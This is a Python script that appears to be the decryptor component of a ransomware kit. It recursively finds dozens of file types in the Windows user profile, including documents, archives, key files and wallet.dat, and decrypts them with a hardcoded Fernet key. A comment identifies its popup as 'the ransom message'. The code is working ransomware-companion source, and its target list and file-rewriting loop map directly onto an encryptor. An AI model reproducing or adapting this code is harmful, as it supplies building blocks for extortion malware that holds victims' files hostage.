#!/usr/bin/python3.8
import tkinter, getpass, glob
from tkinter import messagebox
from cryptography.fernet import Fernet


def decrypt():
    # Decrypt the already encrypted files
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
    usr = getpass.getuser()
    if True:
        print("Getting files to decrypt. This may take a few minutes. Be patient.")
        # Get files to decrypt
        # Get documents in current user to decrypt
        path = 'C:/Users/' + usr
        for f_name in glob.glob(path + '/**/*.txt', recursive=True) \
                      + glob.glob(path + '/**/*.docx', recursive=True) \
                      + glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.ppt', recursive=True) \
                      + glob.glob(path + '/**/*.zip', recursive=True) \
                      + glob.glob(path + '/**/*.jpeg', recursive=True) \
                      + glob.glob(path + '/**/*.png', recursive=True) \
                      + glob.glob(path + '/**/*.svg', recursive=True) \
                      + glob.glob(path + '/**/*.zip', recursive=True) \
                      + glob.glob(path + '/**/*.xlsx', recursive=True) \
                      + glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.wav', recursive=True) \
                      + glob.glob(path + '/**/*.mp3', recursive=True) \
                      + glob.glob(path + '/**/*.mp4', recursive=True) \
                      + glob.glob(path + '/**/*.3gp', recursive=True) \
                      + glob.glob(path + '/**/*.iso', recursive=True) \
                      + glob.glob(path + '/**/*.ico', recursive=True) \
                      + glob.glob(path + '/**/*.lnk', recursive=True) \
                      + glob.glob(path + '/**/*.ink', recursive=True) \
                      + glob.glob(path + '/**/*.xls', recursive=True) \
                      + glob.glob(path + '/**/*.dll', recursive=True) \
                      + glob.glob(path + '/**/*.html', recursive=True) \
                      + glob.glob(path + '/**/*.gz', recursive=True) \
                      + glob.glob(path + '/**/*.css', recursive=True) \
                      + glob.glob(path + '/**/*.js', recursive=True) \
                      + glob.glob(path + '/**/*.3gp', recursive=True) \
                      + glob.glob(path + '/**/*.key', recursive=True) \
                      + glob.glob(path + '/**/wallet.dat', recursive=True) \
                      + glob.glob(path + '/**/*.tar', recursive=True) \
                      + glob.glob(path + '/**/*.tgz', recursive=True) \
                      + glob.glob(path + '/**/*.rar', recursive=True) \
                      + glob.glob(path + '/**/*.java', recursive=True):

            k = key
            f = Fernet(k)
            print("Decrypting files")
            try:
                with open(f_name, "rb") as file:
                    encrypted_data = file.read()

                decrypted_data = f.decrypt(encrypted_data)
                with open(f_name, "wb") as file:
                    file.write(decrypted_data)
            except Exception as e:
                print(e)
                pass
            print("Done. Thank you for waiting")


def message():
    # this function prompts a window containing the ransom message
    window = tkinter.Tk()
    window.wm_withdraw()
    header = "HELLO... YOUR FILES HAVE BEEN DECRYPTED"
    body = "THANK YOU"
    messagebox.showinfo(title=header, message=body)


def main():
    decrypt()
    message()


if __name__ == '__main__':
    main()
